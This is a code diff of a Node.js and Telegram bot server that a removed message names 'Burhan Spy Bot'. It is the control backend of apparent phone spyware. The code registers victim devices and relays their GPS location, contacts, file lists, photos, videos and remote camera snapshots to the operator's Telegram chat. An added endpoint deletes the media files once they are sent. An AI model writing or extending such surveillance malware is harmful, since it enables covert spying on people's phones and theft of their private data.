@@ -10,18 +10,19 @@ const bot = new TelegramBot(token, { polling: true });
 const app = express();
 app.use(express.json());
 
-// 📁 Data Store (JSON file)
-const dataFile = path.join(__dirname, 'devices.json');
+// 📁 DATA STORE KARNE KE LIYE FILE
+const dataFile = path.join('/app/data', 'devices.json');
 let devices = {};
 if (fs.existsSync(dataFile)) {
     devices = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
 }
 
+// 📁 DATA FILE MEIN SAVE KARO
 function saveDevices() {
     fs.writeFileSync(dataFile, JSON.stringify(devices, null, 2));
 }
 
-// ✅ App register karne par
+// ✅ 1. Chhota Data (Device ID, Battery, Location, etc.) Save Karo
 app.post('/api/register-device', (req, res) => {
     const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
     devices[deviceId] = { 
@@ -38,25 +39,12 @@ app.post('/api/register-device', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ Bot ko commands bhejo
-app.post('/api/command', (req, res) => {
-    const { deviceId, command, path } = req.body;
-    // App ko command bhejo
-    axios.post('http://localhost:3000/api/send-command', { deviceId, command, path })
-        .then(() => res.json({ success: true }))
-        .catch(() => res.json({ success: false }));
-});
-
-// ✅ App se data receive karo
+// ✅ 2. Chhota Data (Contacts, Location, Files List) Bot ko bhejo
 app.post('/api/upload-data', (req, res) => {
     const { deviceId, type, data } = req.body;
     
     if (type === 'files') {
         bot.sendMessage(YOUR_USER_ID, `📁 Files for device ${deviceId}:\n${data}`);
-    } else if (type === 'photo') {
-        bot.sendPhoto(YOUR_USER_ID, data);
-    } else if (type === 'video') {
-        bot.sendVideo(YOUR_USER_ID, data);
     } else if (type === 'location') {
         bot.sendMessage(YOUR_USER_ID, `📍 Location for device ${deviceId}: ${data}`);
     } else if (type === 'contacts') {
@@ -67,17 +55,47 @@ app.post('/api/upload-data', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ START — Saare commands dikhao
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!isAuthorized(msg)) {
-        bot.sendMessage(chatId, "⛔ Access Denied!");
-        return;
+// ✅ 3. Bada Data (Photo, Video, Snapshot) Stream karo + Auto-Delete
+app.post('/api/stream-data', (req, res) => {
+    const { deviceId, type, filePath } = req.body;
+    
+    if (type === 'photo') {
+        bot.sendPhoto(YOUR_USER_ID, filePath);
+    } else if (type === 'video') {
+        bot.sendVideo(YOUR_USER_ID, filePath);
+    } else if (type === 'snapshot') {
+        bot.sendPhoto(YOUR_USER_ID, filePath);
     }
-    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 FULL COMMAND LIST:\n/locate <ID> - Live GPS Location\n/devices - List all devices\n/files <ID> - List all files\n/getphoto <ID> <PATH> - Get Photo\n/getvideo <ID> <PATH> - Get Video\n/camera <ID> <front|back> - Camera Snapshot\n/ping <ID> - Check device alive\n/stats - Total devices\n/contacts <ID> - Fetch contacts\n/stop - Stop bot\n/start - Resume bot\n\n⚠️ Any new command cancels ongoing operations.`);
+    
+    // ✅ FILE DELETE KARO (Auto-Delete)
+    try {
+        if (fs.existsSync(filePath)) {
+            fs.unlinkSync(filePath);
+        }
+    } catch (e) {
+        // ignore
+    }
+    
+    res.json({ success: true });
 });
 
-// ✅ /devices — Saare devices
+// ✅ 4. App ko commands bhejo
+app.post('/api/command', (req, res) => {
+    const { deviceId, command, path } = req.body;
+    // App ko command bhejo
+    axios.post('http://localhost:3000/api/send-command', { deviceId, command, path })
+        .then(() => res.json({ success: true }))
+        .catch(() => res.json({ success: false }));
+});
+
+// ✅ 5. App ko commands bhejo (GET /api/commands?deviceId=...)
+app.get('/api/commands', (req, res) => {
+    const { deviceId } = req.query;
+    // Yahan command bhejne ka logic
+    res.json({ command: 'status' });
+});
+
+// ✅ /devices — Saare devices ki list
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -128,8 +146,8 @@ bot.onText(/\/devices/, (msg) => {
     bot.sendMessage(chatId, message);
 });
 
-// ✅ /locate — Live location
-bot.onText(/\/locate (.+)/, (msg, match) => {
+// ✅ /contacts <ID> — Contacts fetch karo
+bot.onText(/\/contacts (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
         bot.sendMessage(chatId, "⛔ Access Denied!");
@@ -140,17 +158,17 @@ bot.onText(/\/locate (.+)/, (msg, match) => {
         bot.sendMessage(chatId, "❌ Device not found!");
         return;
     }
-    // App ko location bhejne ka command
-    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_location' })
+    // App ko contacts bhejne ka command
+    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_contacts' })
         .then(() => {
-            bot.sendMessage(chatId, `📍 Location request sent for device ${deviceId}...`);
+            bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`);
         })
         .catch(() => {
             bot.sendMessage(chatId, "❌ Command send failed!");
         });
 });
 
-// ✅ /files — Files list
+// ✅ /files <ID> — Files scan karo
 bot.onText(/\/files (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -172,7 +190,7 @@ bot.onText(/\/files (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /getphoto — Photo download
+// ✅ /getphoto <ID> <path> — Photo download karo
 bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -195,7 +213,7 @@ bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /getvideo — Video download
+// ✅ /getvideo <ID> <path> — Video download karo
 bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -218,7 +236,7 @@ bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /camera — Snapshot
+// ✅ /camera <ID> <front|back> — Snapshot
 bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -241,7 +259,7 @@ bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
         });
 });
 
-// ✅ /ping — Device alive check
+// ✅ /ping <ID> — Device alive check
 bot.onText(/\/ping (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
@@ -271,50 +289,6 @@ bot.onText(/\/stats/, (msg) => {
         return;
     }
     bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
-});
-
-// ✅ /contacts — Contacts
-bot.onText(/\/contacts (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    if (!isAuthorized(msg)) {
-        bot.sendMessage(chatId, "⛔ Access Denied!");
-        return;
-    }
-    const deviceId = match[1];
-    if (!devices[deviceId]) {
-        bot.sendMessage(chatId, "❌ Device not found!");
-        return;
-    }
-    // App ko contacts bhejne ka command
-    axios.post('http://localhost:3000/api/command', { deviceId, command: 'get_contacts' })
-        .then(() => {
-            bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`);
-        })
-        .catch(() => {
-            bot.sendMessage(chatId, "❌ Command send failed!");
-        });
-});
-
-// ✅ /stop — Bot band karo
-bot.onText(/\/stop/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!isAuthorized(msg)) {
-        bot.sendMessage(chatId, "⛔ Access Denied!");
-        return;
-    }
-    bot.stopPolling();
-    bot.sendMessage(chatId, "🛑 Bot stopped.");
-});
-
-// ✅ /start — Bot resume karo
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!isAuthorized(msg)) {
-        bot.sendMessage(chatId, "⛔ Access Denied!");
-        return;
-    }
-    bot.startPolling();
-    bot.sendMessage(chatId, "✅ Bot resumed.");
 });
 
 // ✅ Authorization check
